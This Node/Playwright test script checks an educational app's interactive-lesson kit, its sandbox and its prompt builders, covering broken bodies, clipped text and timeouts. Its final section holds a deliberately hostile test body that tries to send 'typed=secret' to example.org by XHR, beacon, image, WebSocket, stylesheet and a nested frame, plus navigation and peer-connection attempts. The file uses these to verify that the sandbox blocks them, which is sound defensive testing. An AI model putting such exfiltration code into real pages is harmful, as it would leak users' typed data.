#!/usr/bin/env node
// Kit, sandbox host and interactive builder tests (app/kit, 32-sandbox.js, 33-interactive.js).
// A plain node script: builds a partial page (core + 32 + 33), drives it with Playwright through
// tools/harness, and exits non-zero on any failure. Screenshots of every exemplar at 360 / 1280 px,
// light and dark, opening and moved, land in tests/out/kit/ for review by eye.
//   node tests/e2e/kit.spec.mjs
import { openApp, taskOf, ROOT } from '../../tools/harness/page.mjs';
import { movedValue } from '../../tools/eval/render.mjs';
import { readFileSync, readdirSync, mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { spawnSync } from 'node:child_process';

const OUT = join(ROOT, 'tests', 'out');
const PAGE = join(OUT, 'kit.html');
const SHOTS = join(OUT, 'kit');
mkdirSync(SHOTS, { recursive: true });

let passed = 0;
const failures = [];
function expect(name, ok, detail) {
  if (ok) { passed++; console.log('  ok   ' + name); return; }
  failures.push(name);
  const d = detail === undefined ? '' : (typeof detail === 'string' ? detail : JSON.stringify(detail));
  console.log('  FAIL ' + name + (d ? '\n       ' + d.slice(0, 900) : ''));
}
const section = (t) => console.log('\n' + t);
const near = (a, b, tol) => Math.abs(a - b) <= tol;

// ---------- build ----------
const built = spawnSync(process.execPath, [join(ROOT, 'tools', 'build.mjs'), '--only', '32,33', '--out', PAGE], { encoding: 'utf8' });
if (built.status !== 0) { console.error(built.stdout, built.stderr); process.exit(1); }
console.log(built.stdout.trim());

// ---------- static checks ----------
section('static');
const kitJs = readFileSync(join(ROOT, 'app', 'kit', 'kit.js'), 'utf8');
const kitMd = readFileSync(join(ROOT, 'app', 'kit', 'KIT.md'), 'utf8');
expect('kit.js has no closing script tag or HTML comment opener', !/<\/script|<!--/i.test(kitJs));
const words = kitMd.split(/\s+/).filter(Boolean).length;
expect('KIT.md is at most 2200 words (' + words + ')', words <= 2200);
const exDir = join(ROOT, 'app', 'kit', 'examples');
const examples = readdirSync(exDir).filter((f) => f.endsWith('.html')).sort().map((f) => {
  const body = readFileSync(join(exDir, f), 'utf8');
  const m = body.split('\n')[0].match(/<!--\s*kind:\s*([a-z-]+)\s*-->/i);
  return { name: f.replace(/\.html$/, ''), kind: m && m[1], body };
});
expect('exemplars declare their kind on line 1', examples.length >= 3 && examples.every((e) => e.kind), examples.map((e) => e.name + ':' + e.kind));
expect('exemplars cover every idea kind but skill', ['quantity', 'process', 'mechanism', 'structure', 'history', 'concept'].every((k) => examples.some((e) => e.kind === k)), examples.map((e) => e.kind));
// Every CSS variable a body could see (kit.css :root) is documented, and every one the exemplars use exists.
const kitCss = readFileSync(join(ROOT, 'app', 'kit', 'kit.css'), 'utf8');
const rootVars = [...((kitCss.match(/:root\s*\{([\s\S]*?)\}/) || [])[1] || '').matchAll(/--k-([a-z0-9-]+)\s*:/g)].map((m) => m[1]).filter((v) => v !== 'fs' && v !== 'mono');
const undocumented = rootVars.filter((v) => !kitMd.includes('`' + v + '`') && !kitMd.includes('--k-' + v) && !(/^cat\d$/.test(v) && kitMd.includes('`cat1`-`cat4`')));
expect('KIT.md documents every kit CSS variable', !undocumented.length, undocumented);
const used = [...new Set(examples.concat([{ body: kitMd }]).flatMap((e) => [...e.body.matchAll(/var\(--k-([a-z0-9-]+)\)/g)].map((m) => m[1])))];
expect('the exemplars use only variables the kit defines', used.every((v) => rootVars.includes(v)), used.filter((v) => !rootVars.includes(v)));
expect('KIT.md documents the new APIs and rules',
  ['k-after-move', 'K.afterMove', 'K.moved', 'afterMove: true', 'K.button', 'K.sound.tone', 'K.labels', 'K.stage', '`shade`', 'between', 'decimals', '`cat1`', 'amber-line', 'fill2'].every((w) => kitMd.includes(w)) &&
  /source` may ONLY be a URL from the lesson's own/.test(kitMd) && /Never describe colours by lightness/.test(kitMd) && /at most two short sentences/.test(kitMd) &&
  /conditionally/.test(kitMd));
const kitExample = (kitMd.match(/```html\n([\s\S]*?)```/) || [])[1] || '';
expect('KIT.md contains a complete example', /K\.ready\(\)/.test(kitExample));
const pageHtml = readFileSync(PAGE, 'utf8');
expect('the build filled KIT_MD and KIT_EXAMPLES', !pageHtml.includes('@@KIT_MD@@') && !pageHtml.includes('@@KIT_EXAMPLES@@'));

// ---------- prompt builders in Node (tools/eval/prompts.mjs) ----------
section('prompts (node)');
const fx = join(OUT, 'kit-fixtures');
mkdirSync(fx, { recursive: true });
const topic = {
  id: 'jet', title: 'How jet engines work', query: 'how jet engines work', level: 'new',
  ideas: [
    { id: 'i1', title: 'Squeezing the air pays off', oneLine: 'More squeeze, more work from the same heat', deps: [], kind: 'quantity' },
    { id: 'i2', title: 'How a new engine gets approved', oneLine: 'The steps to certification', deps: ['i1'], kind: 'history' },
  ],
};
const lesson = {
  iid: 'i1', title: 'Squeezing the air pays off',
  predict: { q: 'Double the pressure ratio: does efficiency double?', options: ['Yes', 'No, it rises less'], reveal: 'It rises less.' },
  interactive: {
    brief: 'The one thing you should see is efficiency flattening out when you raise the pressure ratio', title: 'Pressure ratio and efficiency',
    controls: [{ id: 'r', label: 'Pressure ratio', min: 1, max: 50, step: 1, value: 8, unit: ':1' }],
    whatAmILookingAt: 'Ideal Brayton efficiency = 1 - r^(-(gamma-1)/gamma)', ignores: 'Friction and component losses',
    numbers: [{ label: 'gamma for air', value: 1.4, kind: 'constant', source: 1 }],
  },
  explain: { text: 'Squeezing the air first gives the hot gas more [[pressure]] to push the turbine with.[^1]' },
  say: { prompt: 'Why?', rubric: ['a', 'b'], model: 'm' },
  checks: [{ id: 'c1', type: 'target', q: 'Set the ratio so the ideal efficiency is 60%', control: 'r', output: 'eff', target: 60, tolerance: 1.5, why: 'w' }],
  sources: [{ n: 1, title: 'Brayton Cycle', url: 'https://www.grc.nasa.gov/www/k-12/airplane/brayton.html', quote: 'thermal efficiency depends on the pressure ratio' }],
  confidence: 'simplified',
};
writeFileSync(join(fx, 'topic.json'), JSON.stringify(topic, null, 2));
writeFileSync(join(fx, 'lesson.json'), JSON.stringify(lesson, null, 2));
writeFileSync(join(fx, 'body.html'), '<p>hi</p>\n<script>K.ready()</script>\n');
writeFileSync(join(fx, 'report.json'), JSON.stringify({ ok: false, errors: ['K.ready() was never called: call it once at the end of the script.'], overflow: false, checks: [{ label: 'x', ok: false, error: 'returned false' }], sweep: { ok: true, problems: [] }, controls: ['r'], readouts: [], outputs: [] }));
const cli = (args) => spawnSync(process.execPath, [join(ROOT, 'tools', 'eval', 'prompts.mjs'), ...args], { encoding: 'utf8', cwd: ROOT });
const p1 = cli(['build-interactive', '--topic', join(fx, 'topic.json'), '--idea', 'i1', '--lesson', join(fx, 'lesson.json')]);
expect('prompts.mjs build-interactive runs', p1.status === 0, p1.stderr);
expect('build prompt starts with TASK: build-interactive', p1.stdout.startsWith('TASK: build-interactive\n'));
expect('build prompt embeds the kit reference, brief, ids, sources and the quantity exemplar',
  p1.stdout.includes('K.control({id, label, min, max') && p1.stdout.includes('flattening out') && p1.stdout.includes('id "r"') &&
  p1.stdout.includes('reads "eff"') && p1.stdout.includes('grc.nasa.gov') && p1.stdout.includes('kind: quantity -->'));
expect('build prompt ends with the output format', /## Output\nReturn ONLY the body/.test(p1.stdout));
const p2 = cli(['build-interactive', '--topic', join(fx, 'topic.json'), '--idea', 'i2', '--lesson', join(fx, 'lesson.json')]);
const nearest = examples.some((e) => e.kind === 'history') ? 'history' : 'process';
expect('a history idea gets the ' + nearest + ' exemplar', p2.status === 0 && p2.stdout.includes('kind: ' + nearest + ' -->'), p2.stderr);
const p3 = cli(['repair-interactive', '--topic', join(fx, 'topic.json'), '--idea', 'i1', '--lesson', join(fx, 'lesson.json'), '--html', join(fx, 'body.html'), '--report', join(fx, 'report.json')]);
expect('prompts.mjs repair-interactive runs', p3.status === 0, p3.stderr);
expect('repair prompt starts with TASK and lists the problems and the failing body',
  p3.stdout.startsWith('TASK: repair-interactive\n') && p3.stdout.includes('- Error: K.ready() was never called') &&
  p3.stdout.includes('- Check failed: "x"') && p3.stdout.includes('Missing output "eff"') && p3.stdout.includes('<p>hi</p>'));

// ---------- bodies used below ----------
// A tiny body with one slider, one readout and three passing checks; pieces can be swapped out.
function body(js, o = {}) {
  return (o.html || '') + '\n<div class="k-controls" id="c"></div><div class="k-readouts" id="o"></div>\n<script>\n' +
    "K.control({ id: 'a', label: 'A', min: 0, max: 1, step: 0.1, value: 0.5, into: '#c' });\n" +
    "K.readout({ id: 'y', label: 'Y', into: '#o' });\n" + js + '\n' +
    (o.noChecks ? '' : "K.check('one', () => true); K.check('two', () => true); K.check('three', () => true, { source: 'https://example.org/ref' });\n") +
    (o.noReady ? '' : 'K.ready();\n') + '</script>\n';
}
const plain = "K.model((p) => ({ y: p.a * 2 }));";
// A six-option choice whose model breaks at one option.
const choiceBody = '<div class="k-controls" id="c"></div><div class="k-readouts" id="o"></div><script>\n' +
  "K.choice({ id: 'pick', label: 'Pick', value: 1, options: ['a', 'b', 'c', 'd', { value: 'e', label: 'Label E' }, 'f'], into: '#c' });\n" +
  "K.readout({ id: 'y', label: 'Y', into: '#o' });\n" +
  "K.model((p) => ({ y: p.pick === 'e' ? NaN : 1 }));\n" +
  "K.check('one', () => true); K.check('two', () => true); K.check('three', () => true);\nK.ready();\n</script>";


// ---------- broken bodies are caught (their own errors are expected, so a separate page) ----------
section('self-test catches broken bodies');
{
  const app = await openApp({ width: 360, height: 800, file: PAGE });
  await app.page.goto(app.url('#/'));
  await app.page.evaluate(() => U.rt.ready);
  const test = (html, o) => app.page.evaluate(([h, opts]) => U.sandbox.test(h, opts), [html, o || {}]);
  const has = (list, re) => (list || []).some((m) => re.test(m));

  let r = await test(body(plain));
  expect('a small correct body passes', r.ok && r.checks.length === 3 && r.widths.length === 3, r);
  expect('the report lists controls, readouts and model outputs', r.controls.join() === 'a' && r.readouts.join() === 'y' && r.outputs.join() === 'y', r);

  const thrown = body(plain + '\nnotAFunction();');
  r = await test(thrown);
  const line = thrown.split('\n').findIndex((l) => l.includes('notAFunction')) + 1;
  expect('an exception at load fails, naming the body line', !r.ok && has(r.errors, new RegExp('notAFunction.*\\(body line ' + line + '\\)')), r.errors);
  expect('...and reports that K.ready() was never reached', has(r.errors, /K\.ready\(\) was never called/), r.errors);

  r = await test(body("K.model((p) => ({ y: Math.sqrt(p.a - 0.6) }));"));
  expect('a NaN readout fails the sweep', !r.ok && has(r.sweep.problems, /readout "y" was given NaN/), r.sweep);
  r = await test(body("K.model((p) => ({ y: 1 / p.a }));"));
  expect('an Infinity readout fails and says where (a = 0.0)', !r.ok && has(r.sweep.problems, /readout "y" was given Infinity \(at a = 0\.0/), r.sweep);
  r = await test(body(plain, { html: '<div id="wide" style="width:600px">too wide</div>' }));
  expect('horizontal overflow fails and names the element', !r.ok && r.overflow && /div#wide/.test(r.overflowDetail || ''), r);
  r = await test(body(plain + "\nK.check('wrong on purpose', () => K.at({ a: 1 }).y === 3);"));
  const wrong = r.checks.find((c) => c.label === 'wrong on purpose');
  expect('a failing check fails the test', !r.ok && wrong && !wrong.ok && wrong.error === 'returned false', r.checks);
  r = await test(body(plain + "\nK.check('truthy is not true', () => 1);"));
  expect('a check must return exactly true', !r.ok && r.checks.some((c) => !c.ok && /returned 1/.test(c.error || '')), r.checks);
  r = await test(body(plain, { noReady: true }));
  expect('missing K.ready() fails', !r.ok && !r.ready && has(r.errors, /K\.ready\(\) was never called/), r);
  r = await test(body(plain, { noChecks: true }));
  expect('no checks at all fails', !r.ok && has(r.errors, /no K\.check/), r.errors);
  r = await test(body(plain, { html: '<img src="https://example.org/x.png" alt="">' }));
  expect('external resources fail', !r.ok && has(r.errors, /External resources are not allowed/), r.errors);
  r = await test(body(plain + "\nK.update((p) => { if (p.a > 0.9) throw new Error('boom at the top'); });"));
  expect('an update that throws at the end of the range fails, with the setting', !r.ok && has(r.sweep.problems, /K\.update threw .*boom at the top.*\(at a = 1\.0/), r.sweep);
  r = await test(body(plain + "\nK.update(() => { const t = performance.now(); while (performance.now() - t < 170) {} });"), { widths: [340], timeout: 20000 });
  expect('a slow update (> 150 ms) fails', !r.ok && has(r.sweep.problems, /an update took \d+ ms/), r.sweep);
  r = await test(body(plain + "\nconst pl = K.plot(K.el('div'), { x: { min: -1, max: 1 }, y: { min: 0, max: 1 } }); document.body.appendChild(pl.el);\nK.update(() => pl.draw({ series: [{ fn: (x) => Math.sqrt(x), label: 'root' }] }));"));
  expect('a plot fed NaN fails', !r.ok && has(r.sweep.problems, /series "root" has NaN/), r.sweep);
  r = await test(body(plain + "\nK.control({ id: 'b', label: 'B', min: 0, max: 1 });"));
  expect('a control never added to the page fails', !r.ok && has(r.sweep.problems, /control "b" was created but never added/), r.sweep);
  r = await test(body(plain + "\nK.control({ id: 'a', label: 'again', min: 0, max: 1, into: '#c' });"));
  expect('duplicate control ids fail', !r.ok && has(r.errors, /share the id "a"/), r.errors);
  r = await test(body(plain + "\nalert('hello');"));
  expect('alert() fails with a clear message', !r.ok && has(r.errors, /alert\(\) does not work/), r.errors);
  r = await test(body(plain + "\nfetch('https://example.org');"));
  expect('fetch() fails with a clear message', !r.ok && has(r.errors, /fetch\(\) is not available/), r.errors);
  r = await test('<p>' + 'x'.repeat(151 * 1024) + '</p>');
  expect('a body over 150 KB is rejected', !r.ok && has(r.errors, /too large/), r.errors);
  r = await test('<script>const t = Date.now(); while (Date.now() - t < 1500) {}</script>', { widths: [340], timeout: 600 });
  expect('a body that never answers times out as a failing report', !r.ok && has(r.errors, /did not load within/), r.errors);
  expect('srcdoc() refuses an oversized body', await app.page.evaluate(() => { try { U.sandbox.srcdoc('x'.repeat(160 * 1024)); return false; } catch (e) { return e.code === 'too_large'; } }));

  // Timeouts run on a clock that stops while the app is hidden or suspended.
  const slowReady = '<div class="k-controls" id="c"></div><script>K.control({ id: "a", label: "A", min: 0, max: 1, into: "#c" });' +
    "K.check('one', () => true); K.check('two', () => true); K.check('three', () => true); setTimeout(() => K.ready(), 1500);</script>";
  r = await test(slowReady, { widths: [340], timeout: 900 });
  expect('(control) a body that is ready after 1.5 s fails a 0.9 s budget while the app is visible', !r.ok && has(r.errors, /did not load within/), r.errors);
  r = await app.page.evaluate(async (h) => {
    Object.defineProperty(document, 'visibilityState', { configurable: true, get: () => 'hidden' });
    setTimeout(() => { delete document.visibilityState; }, 1800);
    return U.sandbox.test(h, { widths: [340], timeout: 900 });
  }, slowReady);
  expect('time while the app is hidden does not count: the same body passes', r.ok, r.errors);
  const late = await app.page.evaluate(() => new Promise((resolve) => {
    let fired = 0;
    U.sandbox.visibleTimeout(() => { fired = performance.now(); }, 800);
    const t = performance.now();
    while (performance.now() - t < 1200) {}            // the page is frozen (as when the phone suspends it)
    const thawed = performance.now();
    setTimeout(() => resolve({ wait: Math.round(fired - thawed), early: fired && fired < thawed }), 1200);
  }));
  expect('a timer that wakes up late counts the frozen time as one tick, so it never fires early', !late.early && late.wait >= 150, late);

  // Clipped text (cut off, ellipsised, spilling, outside an SVG, labels over each other).
  r = await test(body(plain, { html: '<div id="pill" style="width:80px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">lungs breathe air in</div>' }));
  expect('an ellipsised label fails as clipped text, naming it', !r.ok && has(r.clipped, /"lungs breathe air in" is cut off by <div#pill> \(shortened with "…"/), r.clipped);
  r = await test(body(plain, { html: '<div id="box" style="width:150px;height:22px;overflow:hidden;line-height:22px">one line, then a second line that is hidden</div>' }));
  expect('text cut off at the bottom of a fixed-height box fails', !r.ok && has(r.clipped, /cut off by <div#box> \(cut off at the bottom\)/), r.clipped);
  r = await test(body(plain + "\nK.update((p) => { document.getElementById('lab').textContent = p.a > 0.9 ? '181 for every 120 wobbles' : '3 for 2'; });",
    { html: '<div id="lab" style="width:120px;overflow:hidden;white-space:nowrap;font-weight:700"></div>' }));
  expect('text that clips only at the top of a slider is caught, with the setting', !r.ok && has(r.clipped, /"181 for every 120 wobbles" is cut off .*\(at a = 1\.0/), r.clipped);
  r = await test(body(plain, { html: '<div id="spill" style="width:60px;white-space:nowrap">a no-wrap line spilling out</div>' }));
  expect('a no-wrap line spilling out of its box fails', !r.ok && has(r.clipped, /spills out of <div#spill>/), r.clipped);
  r = await test(body(plain, { html: '<svg viewBox="0 0 100 40" width="100%"><text x="70" y="20" font-size="10">past the edge</text></svg>' }));
  expect('SVG text running outside its viewBox fails', !r.ok && has(r.clipped, /SVG text "past the edge" runs outside its drawing \(right by \d+px\)/), r.clipped);
  r = await test(body(plain + "\nK.update((p) => { document.getElementById('b2').setAttribute('x', p.a > 0.7 ? 32 : 75); });",
    { html: '<svg viewBox="0 0 120 40" width="100%"><text x="30" y="20" font-size="10">swap</text><text id="b2" x="75" y="20" font-size="10">drags back</text></svg>' }));
  expect('SVG labels printed over each other at some setting fail', !r.ok && has(r.clipped, /SVG labels "swap" and "drags back" are printed over each other \(at a = 0\.8/), r.clipped);
  // A word split across two lines (overflow-wrap breaking a word wider than its box) fails, at
  // the size under test and at Text size XL, which the self-test also sweeps; a break at a hyphen
  // or a space is fine.
  // Words in px boxes: "Potassium" in 1rem bold is about 94 px wide at M and 118 px at XL.
  const words = (w) => ['Potassium', 'Austria-Hungary'].map((t, i) => '<b' + (i ? '' : ' id="w"') + ' style="display:block;width:' + w + ';font-size:1rem">' + t + '</b>').join('');
  r = await test(body(plain, { html: words('50px') }));
  expect('a word split across two lines fails, naming the word and its room',
    !r.ok && has(r.clipped, /the word "Potassium" is split across two lines in <b#w> \(it needs \d+px and has 50px\) \(at the opening state/), r.clipped);
  r = await test(body(plain, { html: words('104px') }), { widths: [340] });
  expect('a word that splits only at Text size XL is caught there (the self-test sweeps XL too)',
    !r.ok && has(r.clipped, /"Potassium" is split across two lines .*\(at Text size XL/) && !has(r.clipped, /\(at the opening state/), r.clipped);
  r = await test(body(plain, { html: words('6.5rem') }), { widths: [340] });
  expect('the same boxes sized in rem keep every word whole at XL; a break at a hyphen is fine', r.ok && !r.clipped.length, r.clipped);
  r = await test(body("K.model((p) => ({ y: p.a * 2, z: 1, w: 2, v: 3, u: 4 }));\n" +
    ['z:Electronegativity', 'w:Mass', 'v:Charge', 'u:Radius'].map((t) => "K.readout({ id: '" + t.split(':')[0] + "', label: '" + t.split(':')[1] + "', into: '#o' });").join(' ')), { widths: [720] });
  expect('a readout tile is never narrower than the longest word of its label', r.ok && !r.clipped.length, r.clipped);
  // Ordinary line breaks inside a "word" are not splits: Chinese and Japanese wrap between any two
  // characters, the browser hyphenates where the body asks it to (hyphens: auto), a soft hyphen is
  // a break, and break-all / overflow-wrap: anywhere break long codes on purpose. A Latin word
  // split by overflow-wrap is still caught, inside a Japanese sentence too.
  const wrapping = {
    'a Japanese sentence wider than its box': '<p lang="ja" style="font-size:1.25rem;line-height:1.6">ひらがなとカタカナと漢字を組み合わせて日本語の文章を書きます。</p>',
    'a Chinese sentence wider than its box': '<p lang="zh" style="font-size:1.25rem">汉字是中文的书写系统，每个字都代表一个音节和一个意思，句子之间没有空格。</p>',
    'hyphens: auto with a lang': '<p lang="en" style="hyphens:auto;width:90px">Electronegativity and photosynthesis</p>',
    'a soft hyphen': '<p style="width:6rem">Electro­negativity</p>',
    'a DNA string with word-break: break-all': '<p style="word-break:break-all;font-family:monospace">ATGCGTACGTTAGCATGCGTACGTTAGCATGCGTACGTTAGCATGCGTACGTTAGCATGCGTACGTTAGC</p>',
    'a hex string with overflow-wrap: anywhere': '<p style="overflow-wrap:anywhere;font-family:monospace">0x3fa94c2b7e1d0f5a8c6b3e2d1f0a9b8c7d6e5f4a3b2c1d0e</p>',
  };
  for (const [what, html] of Object.entries(wrapping)) {
    r = await test(body(plain, { html }), { widths: [340] });
    expect(what + ' wraps without failing the self-test (at M and XL)', r.ok && !r.clipped.length, r.clipped.concat(r.errors));
  }
  r = await test(body(plain, { html: '<b id="w" style="display:block;width:50px;font-size:1rem">Germany</b>' }), { widths: [340] });
  expect('"Germany" split across two lines still fails', !r.ok && has(r.clipped, /the word "Germany" is split across two lines in <b#w>/), r.clipped);
  r = await test(body(plain, { html: '<p lang="ja" style="width:120px">これは <b>Electronegativity</b> の説明です。</p>' }), { widths: [340] });
  expect('a Latin word split inside a Japanese sentence still fails (and only that word)',
    !r.ok && has(r.clipped, /the word "Electronegativity" is split/) && r.clipped.length === 1, r.clipped);
  // Common patterns that are not clipping.
  const fine = body(plain + "\nconst rr = K.readout({ id: 'words', label: 'Pattern', into: '#o' }); K.update(() => rr.set('181 for every 120'));",
    { html: '<div class="panel" style="overflow:hidden;border-radius:12px"><p>Rounded panel with ordinary wrapping text that is long enough to wrap onto several lines.</p></div>' +
      '<svg viewBox="0 0 200 60" width="100%" role="img" aria-label="x"><text x="0" y="12" font-size="12">top-left label</text><text x="200" y="58" text-anchor="end" font-size="12">bottom-right label</text>' +
      '<text x="100" y="35" text-anchor="middle" font-size="12" stroke="white" stroke-width="3">halo</text><text x="100" y="35" text-anchor="middle" font-size="12">halo</text></svg>' +
      '<p class="caption" style="white-space:nowrap;overflow:hidden">short caption</p><button class="k-btn">A button</button><div class="k-bar-track" style="width:200px"><i style="width:50%"></i></div>' });
  r = await test(fine);
  expect('ordinary bodies (panels, edge labels, halos, long readout text) are not flagged', r.ok && !r.clipped.length, { clipped: r.clipped, errors: r.errors, sweep: r.sweep.problems });

  // The model's outputs are numbers or short strings.
  r = await test(body("K.model((p) => ({ y: p.a, order: ['x', 'y'] }));"));
  expect('a model output that is a list fails', !r.ok && has(r.sweep.problems, /returned an array for "order"/), r.sweep);

  // Kept-until-moved parts are checked too.
  r = await test(body(plain, { html: '<p class="k-after-move" id="ans" style="width:90px;overflow:hidden;white-space:nowrap">the hidden answer is long</p>' }));
  expect('clipped text inside a k-after-move element is caught (revealed for the test)', !r.ok && has(r.clipped, /the hidden answer is long/), r.clipped);
  r = await test(body(plain + "\nK.update(() => { if (K.moved) throw new Error('only after a move'); });"));
  expect('an update that throws only once Dan has moved is caught', !r.ok && has(r.sweep.problems, /only after a move/), r.sweep);

  // Choice controls: every option swept, reported with its options.
  r = await test(choiceBody);
  expect('a choice is swept through every option (a NaN at option "e" is caught by its label)', !r.ok && has(r.sweep.problems, /readout "y" was given NaN \(at pick = "Label E"(, and \d+ more settings?)?\)/), r.sweep);
  expect('the report lists the choice with its options', r.controls.includes('pick') && JSON.stringify((r.inputs || [])[0] && r.inputs[0].options) === '["a","b","c","d","e","f"]' && r.inputs[0].value === 'b', r.inputs);

  // Buttons and animations are exercised.
  r = await test(body(plain + "\nK.button({ label: 'Shout', into: '#c', press: () => { throw new Error('shout failed'); } });"));
  expect('a K.button whose press throws is caught', !r.ok && has(r.sweep.problems, /K\.button "Shout" threw .*shout failed.*\(at pressing "Shout"/), r.sweep);
  r = await test(body(plain + "\nlet tt = 0; const sp = K.readout({ id: 'speed', label: 'Speed', into: '#o' });\nK.anim({ label: 'Go', into: '#c', step: (dt) => { tt += dt; sp.set(tt > 1.2 ? NaN : tt); } });"));
  expect('an animation that produces NaN after a second is caught', !r.ok && has(r.sweep.problems, /readout "speed" was given NaN \(at playing "Go"/), r.sweep);
  expect('the report lists the actions', JSON.stringify(r.actions) === '["Go"]', r.actions);

  // Sound: calls are checked (without sound) when the self-test presses the button.
  r = await test(body(plain + "\nK.button({ label: 'Hear it', into: '#c', press: () => K.sound.tone(NaN, { dur: 1 }) });"));
  expect('K.sound.tone with a bad frequency is caught when its button is pressed', !r.ok && has(r.sweep.problems, /K\.sound\.tone was given a frequency of NaN/), r.sweep);
  r = await test(body(plain + "\nK.button({ label: 'Hear it', into: '#c', press: () => K.sound.chord([261.63, 329.63, 392], { dur: 1.2, stagger: 0.1 }) });"));
  expect('a good K.sound chord on a button passes quietly', r.ok && !(r.warnings || []).length, r);
  r = await test(body(plain + "\nconst hear = document.createElement('button'); hear.textContent = 'Hear'; hear.onclick = () => K.sound.tone(440); K.$('#c').appendChild(hear);"));
  expect('K.sound used outside any K.button gets advice', has(r.warnings, /K\.sound is used but no K\.button press played anything/), r.warnings);

  // Phone layout: the first control must not be a screen away from the main figure.
  const far = body(plain + "\nconst pf = K.plot('#pf', { x: { min: 0, max: 1 }, y: { min: 0, max: 2 } }); K.update((p) => pf.draw({ series: [{ fn: (x) => 2 * x }] }));",
    { html: '<div id="pf"></div><div style="height:700px" class="panel">a tall second figure</div>' });
  r = await test(far);
  expect('a control far below the main figure on a phone gets advice naming K.stage', has(r.warnings, /first control starts \d+ px below the top of the main figure.*K\.stage/), r.warnings);
  r = await test(far.replace("K.update((p) =>", "K.stage('#pf', '#c'); K.update((p) =>"));
  expect('...and K.stage puts the controls under the figure', !has(r.warnings, /main figure/), r.warnings);

  // Eval run 2: labels touching by a few letters, long axis titles, colour names, anim without
  // its button, held sound, and big after-move holes.
  r = await test(body(plain, { html: '<svg viewBox="0 0 340 60" width="100%" role="img" aria-label="x"><text x="10" y="30" font-size="14">germ arrives</text><text x="88" y="30" font-size="14">same germ returns</text></svg>' }));
  expect('SVG labels touching by a few letters are reported', !r.ok && JSON.stringify(r).includes('are printed over each other'), r.clipped);
  r = await test(body(plain + "\nconst pl = K.plot('#pf', { x: { min: 0, max: 1, label: 'Delay of the second hum, measured from the start of the first hum (% of a wave)' }, y: { min: 0, max: 2 } }); K.update(() => pl.draw({ series: [{ fn: (x) => x }] }));", { html: '<div id="pf"></div>' }), { widths: [340] });
  expect('an axis title far too long for a phone is reported', !r.ok && JSON.stringify(r).includes('is too long for a phone'), r);
  r = await test(body(plain + "\nK.check('kebab colour', () => K.color('amber-line') === K.color('amberLine') && /^#/.test(K.color('amber-line')));\nconst bad = K.color('purpleish');"));
  expect('K.color accepts amber-line and amberLine alike', r.checks.some((c) => c.label === 'kebab colour' && c.ok), r.checks);
  expect('...and warns about a colour role that does not exist', has(r.warnings, /K\.color\('purpleish'\) is not a colour role/), r.warnings);
  r = await test(body(plain + "\nK.anim({ step: () => {}, button: false, into: '#c' });\nK.check('no anim button', () => !document.querySelector('.k-anim'));"));
  expect('K.anim with button: false adds no button', r.ok && r.checks.find((c) => c.label === 'no anim button').ok, r);
  r = await test(body(plain + "\nK.button({ label: 'Hum', into: '#c', press: () => K.sound.hold(NaN) });"));
  expect('K.sound.hold with a bad frequency is caught when its button is pressed', !r.ok && has(r.sweep.problems, /K\.sound\.hold was given a frequency of NaN/), r.sweep);
  r = await test(body(plain + "\nK.button({ label: 'Hum', into: '#c', press: () => { const h = K.sound.hold(100); h.set({ gain: 0.5 }); } });"));
  expect('a held 100 Hz hum warns that a phone speaker cannot play it', r.ok && has(r.warnings, /below what a phone speaker can make/), r.warnings);
  r = await test(body(plain, { html: '<div class="k-after-move" style="height:300px">the answer</div>' }));
  expect('a big after-move block gets advice', has(r.warnings, /large blank space/), r.warnings);

  // Plot shading needs a real edge.
  r = await test(body(plain + "\nconst ps = K.plot(K.el('div'), { x: { min: 0, max: 1 }, y: { min: 0, max: 2 } }); document.body.appendChild(ps.el);\nK.update(() => ps.draw({ series: [{ fn: (x) => x, label: 'low' }], shade: [{ between: ['low', 'high'] }] }));"));
  expect('a shade between a series that does not exist is caught', !r.ok && has(r.sweep.problems, /no series is labelled "high"/), r.sweep);

  // No network from a body, even when it gets around the kit's fetch().
  // A request that got past the policy would reach this route (blocked ones never do).
  const leaks = [];
  await app.context.route(/example\.(org|net)/, (q) => { leaks.push(q.request().url()); q.fulfill({ status: 200, body: '' }); });
  const sneaky = '<div id="out"></div><script>\n' +
    "window.__v = []; document.addEventListener('securitypolicyviolation', (e) => window.__v.push(e.effectiveDirective));\n" +
    "try { delete window.fetch; } catch (e) {}\n" +
    "try { const x = new XMLHttpRequest(); x.open('GET', 'https://example.org/xhr?typed=secret'); x.send(); } catch (e) {}\n" +
    "try { navigator.sendBeacon('https://example.org/beacon', 'typed=secret'); } catch (e) {}\n" +
    "try { new Image().src = 'https://example.org/px.gif?typed=secret'; } catch (e) {}\n" +
    "try { new WebSocket('wss://example.net/ws'); } catch (e) {}\n" +
    "try { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = 'https://example.org/s.css'; document.head.appendChild(l); } catch (e) {}\n" +
    "try { const f = document.createElement('iframe'); f.srcdoc = '<script>fetch(\"https://example.org/inner\").catch(() => {});<' + '/script>'; document.body.appendChild(f); } catch (e) {}\n" +
    "K.check('one', () => true); K.check('two', () => true); K.check('three', () => true);\nK.ready();\n</script>";
  const v = await app.page.evaluate(async (html) => {
    const box = document.body.appendChild(document.createElement('div'));
    const m = U.sandbox.mount(box, { html });
    await m.ready;
    await new Promise((res) => setTimeout(res, 1200));
    return null;
  }, sneaky).then(async () => {
    const fr = app.page.frames().find((f) => f !== app.page.mainFrame() && f.url() === 'about:srcdoc');
    return fr ? fr.evaluate(() => window.__v) : null;
  });
  expect('a body cannot reach the network: XHR, beacon, image, WebSocket, stylesheet and a nested frame are all blocked', leaks.length === 0 && Array.isArray(v) && ['connect-src', 'img-src', 'style-src-elem'].every((d) => v.includes(d)), { leaks, violations: v });
  r = await test(body(plain + "\nK.button({ label: 'Go', into: '#c', press: () => { location.href = 'https://example.org/?typed=' + 1; } });"));
  expect('a body that navigates its frame away is refused', !r.ok && has(r.errors, /may not navigate, open connections or make frames \(found "location\.href =/), r.errors);
  r = await test(body(plain, { html: '<p>Read <a href="https://example.org/more">more</a></p>' }));
  expect('a link out of the page is refused', !r.ok && has(r.errors, /Links and forms that leave the page are not allowed: <a https:\/\/example\.org\/more>/), r.errors);
  r = await test(body(plain + "\nconst pc = window.RTCPeerConnection; K.check('no peer connections', () => pc === undefined);"));
  expect('peer-to-peer connections are not available in the frame', r.checks.some((c) => c.label === 'no peer connections' && c.ok), r.checks);
  expect('...and naming them in a body is refused', !r.ok && has(r.errors, /found "RTCPeerConnection"/), r.errors);
